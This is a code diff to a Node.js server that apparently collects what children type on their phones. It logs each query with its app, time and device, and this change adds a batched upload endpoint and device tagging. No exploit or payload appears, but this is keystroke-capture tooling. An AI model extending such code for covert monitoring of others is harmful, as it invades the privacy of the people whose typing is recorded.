@@ -43,6 +43,21 @@ function ensureKid(ip) {
   return kidsByIP[ip];
 }
 
+function recordTyping(who, query, pkg, app, when) {
+  if (query == null) return;
+  // keep docs/panel one-line even if a client sends raw newlines/tabs
+  const text = String(query).replace(/\s+/g, ' ').trim();
+  if (!text) return;
+  const t = new Date(+when || Date.now()).toISOString();
+  const kid = ensureKid(who);
+  kid.lastQuery = text;
+  kid.lastPkg = pkg || null;
+  kid.lastApp = app || null;
+  kid.buffer.push({ time: t, text, pkg: pkg || null, app: app || null });
+  fs.appendFileSync(LOG_FILE, `[${t}] ${who}${app ? ' (' + app + ')' : ''}: ${text}\n`);
+  console.log(`🔍 [${who}]${app ? ' [' + app + ']' : ''} "${text}"`);
+}
+
 function nicknameFor(ip) {
   const k = kidsByIP[ip];
   return (k && k.nickname) || 'kid';
@@ -60,7 +75,7 @@ function flushKidDocuments(force = false) {
     const name = nicknameFor(ip);
     const file = path.join(DOCS_DIR, `${name}${kid.docCount}_${ip}_${stamp}.md`);
     const lines = [
-      `# ${name} — ${ip}`,
+      `# ${name} — ${ip}${kid.device ? ' · ' + kid.device : ''}`,
       `# ${new Date(now).toISOString()} (${kid.buffer.length} entries)`,
       '',
       ...kid.buffer.map(e => `- [${e.time}]${e.app ? ' [' + e.app + ']' : ''} ${e.text}`),
@@ -171,17 +186,33 @@ const server = http.createServer(async (req, res) => {
       const srcIP = params.get('ip') || url.searchParams.get('ip') || ip;
       const pkg = params.get('pkg') || null;
       const app = params.get('app') || null;
-      if (query) {
-        const t = new Date().toISOString();
-        const kid = ensureKid(srcIP);
-        kid.lastQuery = query;
-        kid.lastPkg = pkg;
-        kid.lastApp = app;
-        kid.buffer.push({ time: t, text: query, pkg, app });
-        fs.appendFileSync(LOG_FILE, `[${t}] ${srcIP}${app ? ' (' + app + ')' : ''}: ${query}\n`);
-        console.log(`🔍 [${srcIP}]${app ? ' [' + app + ']' : ''} "${query}"`);
-      }
+      const device = (params.get('device') || '').trim();
+      if (device) ensureKid(srcIP).device = device.slice(0, 80);
+      recordTyping(srcIP, query, pkg, app, params.get('time'));
       send(res, 200, { status: 'logged' });
+      return;
+    }
+
+    // batched typing: {"device":"...","events":[{query,pkg,app,time},...]}
+    if (p === '/kid-alert-batch' && req.method === 'POST') {
+      const body = await readBody(req);
+      const who = url.searchParams.get('ip') || ip;
+      let payload;
+      try { payload = JSON.parse(body || '{}'); }
+      catch (e) { send(res, 400, { ok: false, error: 'body is not JSON' }); return; }
+
+      const kid = ensureKid(who);
+      const device = payload && typeof payload.device === 'string' ? payload.device.trim() : '';
+      if (device) kid.device = device.slice(0, 80);
+      const events = payload && Array.isArray(payload.events) ? payload.events : [];
+      let stored = 0;
+      for (const e of events) {
+        if (!e || typeof e.query !== 'string' || !e.query) continue;
+        recordTyping(who, e.query, e.pkg, e.app, e.time);
+        stored++;
+      }
+      console.log(`📦 [${who}] batch ${stored}/${events.length}${kid.device ? ' from ' + kid.device : ''}`);
+      send(res, 200, { ok: true, ip: who, stored });
       return;
     }
 
@@ -196,6 +227,7 @@ const server = http.createServer(async (req, res) => {
           lastQuery: k.lastQuery || null,
           lastApp: k.lastApp || null,
           lastPkg: k.lastPkg || null,
+          device: k.device || null,
           lastSeen: k.lastSeen,
           online: now - k.lastSeen < 90000, // saw something <90s ago
           recent: k.buffer.slice(-20).map(e => ({ time: e.time, text: e.text, app: e.app || null, pkg: e.pkg || null })),
@@ -224,7 +256,12 @@ const server = http.createServer(async (req, res) => {
     // list saved documents
     if (p === '/kid-docs' && req.method === 'GET') {
       let files = [];
-      try { files = fs.readdirSync(DOCS_DIR).filter(f => f.endsWith('.md')).sort().reverse(); } catch {}
+      try {
+        files = fs.readdirSync(DOCS_DIR).filter(f => f.endsWith('.md'))
+          .map(f => ({ f, m: fs.statSync(path.join(DOCS_DIR, f)).mtimeMs || 0 }))
+          .sort((a, b) => b.m - a.m)   // newest first (names start with docCount, not date)
+          .map(x => x.f);
+      } catch {}
       send(res, 200, { files, docsDir: DOCS_DIR });
       return;
     }
@@ -248,6 +285,7 @@ const server = http.createServer(async (req, res) => {
       const list = Object.keys({ ...stored, ...kidsByIP }).map(kIp => ({
         ip: kIp,
         nickname: (kidsByIP[kIp] && kidsByIP[kIp].nickname) || stored[kIp] || null,
+        device: (kidsByIP[kIp] && kidsByIP[kIp].device) || null,
         online: kidsByIP[kIp] ? now - kidsByIP[kIp].lastSeen < 90000 : false,
         lastSeen: kidsByIP[kIp] ? kidsByIP[kIp].lastSeen : null
       }));
@@ -262,6 +300,7 @@ const server = http.createServer(async (req, res) => {
       send(res, 200, {
         ip: kIp,
         nickname: (kidsByIP[kIp] && kidsByIP[kIp].nickname) || stored[kIp] || null,
+        device: (kidsByIP[kIp] && kidsByIP[kIp].device) || null,
         online: kidsByIP[kIp] ? Date.now() - kidsByIP[kIp].lastSeen < 90000 : false,
         lastQuery: kidsByIP[kIp] && kidsByIP[kIp].lastQuery
       });
@@ -321,7 +360,9 @@ const server = http.createServer(async (req, res) => {
       const params = new URLSearchParams(body);
       const srcIP = params.get('ip') || ip;
       const kid = ensureKid(srcIP);
-      console.log(`🔌 phone connected: ${srcIP}`);
+      const device = (params.get('device') || '').trim();
+      if (device) kid.device = device.slice(0, 80);
+      console.log(`🔌 phone connected: ${srcIP}${kid.device ? ' (' + kid.device + ')' : ''}`);
       send(res, 200, { ok: true, ip: srcIP, nickname: kid.nickname || null, setNickname: !kid.nickname });
       return;
     }
@@ -378,6 +419,7 @@ const server = http.createServer(async (req, res) => {
         pkg: a.pkg ? String(a.pkg).slice(0, 200) : null,
         app: a.app ? String(a.app).slice(0, 120) : null,
         msg: a.msg ? String(a.msg).slice(0, 200) : null,
+        device: a.device ? String(a.device).slice(0, 80) : null,
         at: +a.at || Date.now(),
         ip: who
       };
